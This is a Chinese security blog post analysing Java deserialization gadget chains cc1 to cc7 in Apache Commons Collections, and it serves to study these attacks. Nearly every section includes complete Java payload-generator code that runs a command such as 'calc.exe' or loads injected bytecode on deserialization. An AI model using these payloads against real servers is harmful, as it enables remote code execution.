---
title: "CommonsCollections 反序列化分析"
date: 2022-11-23T14:21:14+08:00
lastmod: 2022-11-23T14:21:14+08:00
draft: false
author: "X1r0z"

tags: ['cc']
categories: ['Java 安全']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

CommonsCollections 反序列化分析, 鸽了好久了

<!--more-->

## 基本知识

Apache Commons Collections 可以看成是 jdk Collection 类的扩展, 它对常用的数据结构操作进行了很好的封装, 抽象和补充

cc 链反序列化的根本原因就是它提供了一系列的 transformer, 将这些 transformer 组合起来就可以执行任意命令甚至是 java 字节码

下面介绍一些基本的 transformer 类, 代码只贴出关键部分

### Transformer

接口, 子类需要实现 transform 方法

```java
public interface Transformer {
    Object transform(Object var1);
}
```

### ConstantTransformer

一个包装类, 调用 transform 时将实例化传入的 constantToReturn 对象返回

```java
public class ConstantTransformer implements Transformer, Serializable {
    private static final long serialVersionUID = 6374440726369055124L;
    public static final Transformer NULL_INSTANCE = new ConstantTransformer((Object)null);
    private final Object iConstant;

......

    public ConstantTransformer(Object constantToReturn) {
        this.iConstant = constantToReturn;
    }

    public Object transform(Object input) {
        return this.iConstant;
    }

......
    
}
```

### InvokerTransformer

核心 transformer, transform 中会通过反射调用指定方法

```java
public class InvokerTransformer implements Transformer, Serializable {
    private static final long serialVersionUID = -8653385846894047688L;
    private final String iMethodName;
    private final Class[] iParamTypes;
    private final Object[] iArgs;

......

    private InvokerTransformer(String methodName) {
        this.iMethodName = methodName;
        this.iParamTypes = null;
        this.iArgs = null;
    }

    public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
        this.iMethodName = methodName;
        this.iParamTypes = paramTypes;
        this.iArgs = args;
    }

    public Object transform(Object input) {
        if (input == null) {
            return null;
        } else {
            try {
                Class cls = input.getClass();
                Method method = cls.getMethod(this.iMethodName, this.iParamTypes);
                return method.invoke(input, this.iArgs);
            } catch (NoSuchMethodException var4) {
                throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' does not exist");
            } catch (IllegalAccessException var5) {
                throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' cannot be accessed");
            } catch (InvocationTargetException var6) {
                throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' threw an exception", var6);
            }
        }
    }
}
```

### ChainedTransformer

类似于链式反应, 将上一个 transform 方法的返回值作为下一个 transform 的参数

```java
public class ChainedTransformer implements Transformer, Serializable {
    private static final long serialVersionUID = 3514945074733160196L;
    private final Transformer[] iTransformers;

......

    public ChainedTransformer(Transformer[] transformers) {
        this.iTransformers = transformers;
    }

    public Object transform(Object object) {
        for(int i = 0; i < this.iTransformers.length; ++i) {
            object = this.iTransformers[i].transform(object);
        }

        return object;
    }

    public Transformer[] getTransformers() {
        return this.iTransformers;
    }
}
```

### InstantiateTransformer

通过反射获取构造方法并实例化某个类

```java
public class InstantiateTransformer implements Transformer, Serializable {
    private static final long serialVersionUID = 3786388740793356347L;
    public static final Transformer NO_ARG_INSTANCE = new InstantiateTransformer();
    private final Class[] iParamTypes;
    private final Object[] iArgs;

......

    private InstantiateTransformer() {
        this.iParamTypes = null;
        this.iArgs = null;
    }

    public InstantiateTransformer(Class[] paramTypes, Object[] args) {
        this.iParamTypes = paramTypes;
        this.iArgs = args;
    }

    public Object transform(Object input) {
        try {
            if (!(input instanceof Class)) {
                throw new FunctorException("InstantiateTransformer: Input object was not an instanceof Class, it was a " + (input == null ? "null object" : input.getClass().getName()));
            } else {
                Constructor con = ((Class)input).getConstructor(this.iParamTypes);
                return con.newInstance(this.iArgs);
            }
        } catch (NoSuchMethodException var3) {
            throw new FunctorException("InstantiateTransformer: The constructor must exist and be public ");
        } catch (InstantiationException var4) {
            throw new FunctorException("InstantiateTransformer: InstantiationException", var4);
        } catch (IllegalAccessException var5) {
            throw new FunctorException("InstantiateTransformer: Constructor must be public", var5);
        } catch (InvocationTargetException var6) {
            throw new FunctorException("InstantiateTransformer: Constructor threw an exception", var6);
        }
    }
}
```

## CommonsCollections1

cc1 算是整个 cc 链中最重要的一条, 把它搞明白基本上后面的链就很容易理解了

目前有两种形式, TransformedMap 和 LazyMap

TransformedMap 被提出的历史很久远, 但其实 LazyMap 利用范围更广, 后面的 cc 链很多也都是用的 LazyMap 而非 TransformedMap

另外由于从 jdk 8u71 开始, AnnotationInvocationHandler readObject 的逻辑被更改, 所以 cc1 在高版本 jdk 上无法利用

### TransformedMap

TransformedMap 的功能是在 put 时进行回调

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211231505692.png)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211231506594.png)

将 key value 作为参数传递给各自的 transformer transform 方法

keyTransformer 和 valueTransformer 可以在构造方法中传入, 也可以调用 decorate  静态方法获得一个带有这两个 transformer 的 TransformedMap

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211231508780.png)

下面看一个简单的 demo

```java
package com.example.CommonsCollections1;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.util.HashMap;
import java.util.Map;

public class CommonCollections1Demo {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.getRuntime()),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"})
        }; // 构造一条 transformer 链来调用 Runtime.exec 执行命令
        Transformer transformerChain = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); // 获得被 TransformedMap 包装的 Map, 其中传入 transformerChain 作为 valueTransformer
        outerMap.put("test", "123"); // 调用 put 触发回调
    }
}
```

执行后成功弹出计算器

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211231511285.png)

不过这个 demo 有几个问题

1. Runtime 类实际上是不能序列化的

1. 代码中是通过手动调用 put 来触发回调, 那么我们如何在反序列化即 readObject 的过程中自动调用 put 方法

对于第一个问题, 我们需要通过反射来获取 Runtime, 因为 Class 对象继承了 Serializable, 能够被序列化

```java
Transformer[] transformers = new Transformer[]{
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer("getDeclaredMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
        new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
        new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"}),
        new ConstantTransformer(1)
};
```

对于第二个问题, ysoserial 使用了 AnnotationInvocationHandler 这个代理类, 它的 readObject 最终会调用 put 方法

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211231516807.png)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211231519342.png)

其中 `var5.setValue()` 最终调用的就是 `memberValues.put()`

那么我们只需要将 outerMap 放入 AnnotationInvocationHandler 中, 让服务器反序列化这个代理类, 不就可以弹出计算器了吗?

不过还有两个问题

1. AnnotationInvocationHandler 的构造函数要求传入的 Class 必须使用了 Annotation 注解, 并且只继承自 Annotation 接口
2. memberValues 内必须存在某个 key, 这个 key 的内容为 type 类中的某个方法

p 牛在这里找的是 Retention 这个类

```java
@Documented
@Retention(RetentionPolicy.RUNTIME)
@Target(ElementType.ANNOTATION_TYPE)
public @interface Retention {
    /**
     * Returns the retention policy.
     * @return the retention policy
     */
    RetentionPolicy value();
}
```

存在 value 方法, 那么我们只需要向 Map 中放入这个 key, 最终就会触发反序列化

```java
package com.example.CommonsCollections1;

import com.example.Reflection;
import com.example.Serialization;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.lang.annotation.Retention;
import java.lang.reflect.*;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollections1TransformedMap {
    public static void main(String[] args) throws Exception{
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getDeclaredMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"}),
                new ConstantTransformer(1)
        }; // 通过反射获取 Runtime 对象来执行命令

        Transformer transformerChain = new ChainedTransformer(new Transformer[]{new ConstantTransformer(1)}); // 先将 chain 设置成其它 transformer, 防止生成 exp 的时候触发回调

        Map innerMap = new HashMap();
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); // 得到 TransformedMap

        innerMap.put("value", 123); // 放入 value key

        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler"); // 通过反射实例化 AnnotationInvocationHandler
        Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(Retention.class, outerMap); // 利用 Retention.class 绕过构造方法限制

        Reflection.setFieldValue(transformerChain, "iTransformers", transformers); // 通过反射将 chain 设置回去
        Serialization.test(handler); // writeObject and readObject
    }
}
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211231533856.png)

### LazyMap

ysoserial 用的是 LazyMap, 它的功能就是 "懒加载", 即在找不到某个元素的时候, 通过调用 transform 来获取该元素

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211231536140.png)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211231536148.png)

LazyMap 的触发点是 get 方法, 那么只需要找到一个在 readObject 时调用了 get 方法的类即可

与 TransformedMap 不同的是, AnnotationInvocationHandler 的 readObject 中并没有调用到 get 方法, ysoserial 的解决方法是通过动态代理用 AnnotationInvocationHandler 生成 Proxy Map, 当 readObject 中调用这个 Map 的任意方法时, 触发代理类的 invoke 方法, 刚好 AnnotationInvocationHandler invoke 中调用了 get 方法

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211231542991.png)

switch default 中调用了 `memberValues.get()`

其它部分跟构造 TransformedMap 时的一样, payload 如下

```java
package com.example.CommonsCollections1;

import com.example.Reflection;
import com.example.Serialization;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.lang.annotation.Retention;
import java.lang.reflect.*;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollections1LazyMap {
    public static void main(String[] args) throws Exception{
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getDeclaredMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"}),
                new ConstantTransformer(1)
        };

        Transformer transformerChain = new ChainedTransformer(new Transformer[]{new ConstantTransformer(1)});

        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, transformerChain);

        innerMap.put("value", 123);

        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(Retention.class, outerMap); // 先生成代理 handler

        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[]{Map.class}, handler); // 通过 AnnotationInvocationHandler 代理 outerMap

        Object obj = constructor.newInstance(Retention.class, proxyMap); // 这里再创建 AnnotationInvocationHandler, 原因是我们的利用链是 AnnotationInvocationHandler.readObject() -> AnnotationInvocationHandler.invoke() -> LazyMap.get(), 前后两个 AnnotationInvocationHandler 并不相同

        Reflection.setFieldValue(transformerChain, "iTransformers", transformers);
        Serialization.test(obj);
    }
}
```

弹出计算器

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211231547099.png)

最后附上 ysoserial 中的利用链

```
Gadget chain:
    ObjectInputStream.readObject()
        AnnotationInvocationHandler.readObject()
            Map(Proxy).entrySet()
                AnnotationInvocationHandler.invoke()
                    LazyMap.get()
                        ChainedTransformer.transform()
                            ConstantTransformer.transform()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Class.getMethod()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Runtime.getRuntime()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Runtime.exec()
```

## CommonsCollections6

cc6 解决的是 cc1 在高版本 jdk 上无法利用的问题

```
Gadget chain:
    java.io.ObjectInputStream.readObject()
        java.util.HashSet.readObject()
            java.util.HashMap.put()
            java.util.HashMap.hash()
                org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()
                org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()
                    org.apache.commons.collections.map.LazyMap.get()
                        org.apache.commons.collections.functors.ChainedTransformer.transform()
                        org.apache.commons.collections.functors.InvokerTransformer.transform()
                        java.lang.reflect.Method.invoke()
                            java.lang.Runtime.exec()
```

本质是通过 HashMap readObject 时的 `key.hashCode()` 跳转到 TiedMapEntry, 它的 hashCode 方法最终会调用到 `LazyMap.get()`

看一下 TiedMapEntry 的定义

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211231552148.png)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211231552536.png)

当 map 设置为 LazyMap 的时候, 通过 `hashCode() -> getValue() -> this.map.get(this.key)` 来触发 transformer

payload 如下

```java
package com.example.CommonsCollections6;

import com.example.Reflection;
import com.example.Serialization;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.util.HashMap;
import java.util.Map;

public class CommonsCollections6 {
    public static void main(String[] args) throws Exception{
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getDeclaredMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"}),
                new ConstantTransformer(1)
        };

        Transformer transformerChain = new ChainedTransformer(new Transformer[]{new ConstantTransformer(1)});

        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, transformerChain);

        TiedMapEntry tme = new TiedMapEntry(outerMap, "keykey"); // 传入 outerMap 和一个任意的 key

        Map expMap = new HashMap();
        expMap.put(tme, "valuevalue");
        innerMap.remove("keykey"); // 因为 HashMap put 时也会调用 key.hashCode(), 所以需要将原来的 keykey 删除 (keykey 通过 LazyMap 懒加载进入 innerMap)

        Reflection.setFieldValue(transformerChain, "iTransformers", transformers);
        Serialization.test(expMap);
    }
}
```

## CommonsCollections5

cc5 将 cc6 的入口点 HashMap 替换成了 BadAttributeValueExpException

```
Gadget chain:
    ObjectInputStream.readObject()
        BadAttributeValueExpException.readObject()
            TiedMapEntry.toString()
                LazyMap.get()
                    ChainedTransformer.transform()
                        ConstantTransformer.transform()
                        InvokerTransformer.transform()
                            Method.invoke()
                                Class.getMethod()
                        InvokerTransformer.transform()
                            Method.invoke()
                                Runtime.getRuntime()
                        InvokerTransformer.transform()
                            Method.invoke()
                                Runtime.exec()
```

BadAttributeValueExpException 的 readObject 方法

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211231601783.png)

其中的 val 在构造方法中传入

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211231602099.png)

从之前的图也可以看到 TiedMapEntry 的 toString 也会调用到 getValue, 进而触发 LazyMap 回调

因为构造方法中传入的 val 会自动调用 toString, 所以需要用到反射来赋值

payload 如下

```java
package com.example.CommonsCollections5;

import com.example.Reflection;
import com.example.Serialization;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollections5 {
    public static void main(String[] args) throws Exception{
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getDeclaredMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"}),
                new ConstantTransformer(1)
        };

        Transformer transformerChain = new ChainedTransformer(new Transformer[]{new ConstantTransformer(1)});

        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, transformerChain);

        TiedMapEntry tme = new TiedMapEntry(outerMap, "keykey");

        BadAttributeValueExpException val = new BadAttributeValueExpException(null);
        Reflection.setFieldValue(val, "val", tme); // 通过反射更改 val

        Reflection.setFieldValue(transformerChain, "iTransformers", transformers);
        Serialization.test(val);
    }
}
```

## CommonsCollections3

cc3 相比于前面的 cc 链有两个特性, 第一是它引入了 TemplatesImpl 来执行任意 java 字节码, 第二是它将 InvokerTransformer 换成了 InstantiateTransformer, 并通过 TrAXFilter 来引发 TemplatesImpl 链

前面讲过 InstantiateTransformer 可以实例化某个类, 这里实例化的是 TrAXFilter

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211231623073.png)

它的构造方法会调用 `templates.newTransformer()`, 正好能与 TemplatesImpl 链串起来

TemplatesImpl 在之前讲 ClassLoader 的时候分析过, 这里就不写了

payload 如下

```java
package com.example.CommonsCollections3;

import com.example.Evil;
import com.example.Reflection;
import com.example.Serialization;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.xml.transform.Templates;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollections3 {
    public static void main(String[] args) throws Exception{

        TemplatesImpl templatesImpl = new TemplatesImpl();
        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.get(Evil.class.getName());
        byte[] code = clazz.toBytecode();

        Reflection.setFieldValue(templatesImpl, "_name", "Hello");
        Reflection.setFieldValue(templatesImpl, "_bytecodes", new byte[][]{code});
        Reflection.setFieldValue(templatesImpl, "_tfactory", new TransformerFactoryImpl());

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templatesImpl})
        };

        Transformer transformerChain = new ChainedTransformer(new Transformer[]{new ConstantTransformer(1)});

        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, transformerChain);

        TiedMapEntry tme = new TiedMapEntry(outerMap, "keykey");

        Map expMap = new HashMap();
        expMap.put(tme, "valuevalue");
        outerMap.remove("keykey");

        Reflection.setFieldValue(transformerChain, "iTransformers", transformers);
        Serialization.test(expMap);
    }
}
```

## CommonsCollections7

cc7 利用的是 hash 碰撞来触发 Hashtable 的 equals 方法, 进而调用 LazyMap get

```
Payload method chain:

java.util.Hashtable.readObject
java.util.Hashtable.reconstitutionPut
org.apache.commons.collections.map.AbstractMapDecorator.equals
java.util.AbstractMap.equals
org.apache.commons.collections.map.LazyMap.get
org.apache.commons.collections.functors.ChainedTransformer.transform
org.apache.commons.collections.functors.InvokerTransformer.transform
java.lang.reflect.Method.invoke
sun.reflect.DelegatingMethodAccessorImpl.invoke
sun.reflect.NativeMethodAccessorImpl.invoke
sun.reflect.NativeMethodAccessorImpl.invoke0
java.lang.Runtime.exec
```

关注 Hashtable 的 readObject

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211232048387.png)

循环获取 key 和 value 之后会调用 reconstitutionPut 来放入 hashtable

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211232049499.png)

这里调试的是第二次循环, 先计算 key hashCode, 然后得到 index 索引, 通过 index 来检测 hashtable 中是否已经存在对应的元素

如果存在的话会比对两者的 hash 是否相同, 然后调用 key (也就是 LazyMap) 的 equals 方法

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211232053834.png)

LazyMap 继承自 AbstractMapDecorator, AbstractMapDecorator 的 equals 调用的是 HashMap 的 equals, 而 HashMap 没有重写 equals 方法, 所以会跳转到它的父类 AbstractMap 的 equals 方法

之后先判断传入的 o (另一个 LazyMap) 是否为 map 本身, 然后判断 map 大小是否相等, 最后代码执行到如图所示的地方, 调用 `m.get(key)` 来触发 transform 链

需要注意第二次循环时必须得先让 `e.hash == hash`, 否则根据短路运算的特性无法执行后面的 `e.key.equals(key)`

LazyMap 的 hashCode 调用链与 equals 一样, 最终会来到 AbstractMap 的 hashCode

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211232105540.png)

cc7 的 hash 碰撞来源于 `String.hashCode()` 的缺陷, 这里不展开讲了, 简单来说就是下面的表达式为 true

```java
"yy".equals("zZ")
```

构造的思路就是将 yy zZ 分别放入两个 LazyMap, 然后将这两个 LazyMap 作为 key 放入 Hashtable

payload 如下

```java
package com.example.CommonsCollections7;

import com.example.Reflection;
import com.example.Serialization;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

public class CommonsCollections7 {
    public static void main(String[] args) throws Exception{

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getDeclaredMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"}),
                new ConstantTransformer(1)
        };

        Transformer transformerChain = new ChainedTransformer(new Transformer[]{});

        Map innerMap1 = new HashMap();
        Map innerMap2 = new HashMap();

        Map lazyMap1 = LazyMap.decorate(innerMap1, transformerChain);
        lazyMap1.put("yy", 1); // 放入 yy

        Map lazyMap2 = LazyMap.decorate(innerMap2, transformerChain);
        lazyMap2.put("zZ", 1); // 放入 zZ, 其中 value 的值要和上面的相同

        Hashtable hashtable = new Hashtable();
        hashtable.put(lazyMap1, 1); // 将 LazyMap 放入 Hashtable, value 任意
        hashtable.put(lazyMap2, 2);

        Reflection.setFieldValue(transformerChain, "iTransformers", transformers);

        lazyMap2.remove("yy"); // 因为 put 第二次的时候会进入 equals, 然后调用 m.get("yy"), LazyMap 的懒加载最终会将 yy 也放入 map 中, 所以要把 innerMap2 中的 yy 删掉

        Serialization.test(hashtable);
    }
}
```

## CommonsCollections2

因为目前 commons-collections 有两个大版本 3 和 4, 而 cc2 cc4 这两条链就是 ysoserial 给 commons-collections4 准备的

当然其它 cc 链经过简单的修改之后也能够在 commons-collections4 中使用

以下是 cc2 的利用链

```
Gadget chain:
    ObjectInputStream.readObject()
        PriorityQueue.readObject()
            ...
                TransformingComparator.compare()
                    InvokerTransformer.transform()
                        Method.invoke()
                            Runtime.exec()
```

先看 PriorityQueue 的 readObject 方法

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211231635386.png)

跟进 heapify()

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211231635036.png)

继续跟进 shiftDown()

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211231636059.png)

判断是否存在 comparator (通过构造方法传入), 存在的话则会进入 siftDownUsingComparator()

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211231637148.png)

在方法中会调用 comparator 实现的 compare 方法来比较 queue 中的元素, 而在 commons-collections4 中存在一个 TransformingComparator, 它的 compare 会调用 transform 方法

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211231638491.png)

到这里思路已经很明显了, payload 如下

```java
package com.example.CommonsCollections2;

import com.example.Reflection;
import com.example.Serialization;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.comparators.TransformingComparator;

import java.util.Comparator;
import java.util.PriorityQueue;

public class CommonsCollections2 {
    public static void main(String[] args) throws Exception{

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getDeclaredMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"}),
                new ConstantTransformer(1)
        };

        Transformer transformerChain = new ChainedTransformer(new Transformer[]{new ConstantTransformer(1)});

        Comparator comparator = new TransformingComparator(transformerChain); // 实例化 TransformingComparator 并传入 ChainedTransformer

        PriorityQueue priorityQueue = new PriorityQueue(2, comparator); // 实例化 PriorityQueue 并传入 comparator
        priorityQueue.add(1);
        priorityQueue.add(2); // 至少添加两个元素才会触发 compare 方法

        Reflection.setFieldValue(transformerChain, "iTransformers", transformers);
        Serialization.test(priorityQueue);

    }
}
```

## CommonsCollections4

cc4 就是将 cc2 的 InvokerTransformer 替换成了 InstantiateTransforme, 然后利用 TemplatesImpl 来执行字节码

直接给出 payload

```java
package com.example.CommonsCollections4;

import com.example.Evil;
import com.example.Reflection;
import com.example.Serialization;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;
import org.apache.commons.collections4.comparators.TransformingComparator;

import javax.xml.transform.Templates;
import java.util.Comparator;
import java.util.PriorityQueue;

public class CommonsCollections4 {
    public static void main(String[] args) throws Exception{

        TemplatesImpl templatesImpl = new TemplatesImpl();
        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.get(Evil.class.getName());
        byte[] code = clazz.toBytecode();

        Reflection.setFieldValue(templatesImpl, "_name", "Hello");
        Reflection.setFieldValue(templatesImpl, "_bytecodes", new byte[][]{code});
        Reflection.setFieldValue(templatesImpl, "_tfactory", new TransformerFactoryImpl());

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templatesImpl})
        };

        Transformer transformerChain = new ChainedTransformer(new Transformer[]{new ConstantTransformer(1)});

        Comparator comparator = new TransformingComparator(transformerChain);

        PriorityQueue priorityQueue = new PriorityQueue(2, comparator);
        priorityQueue.add(1);
        priorityQueue.add(2);

        Reflection.setFieldValue(transformerChain, "iTransformers", transformers);
        Serialization.test(priorityQueue);

    }
}
```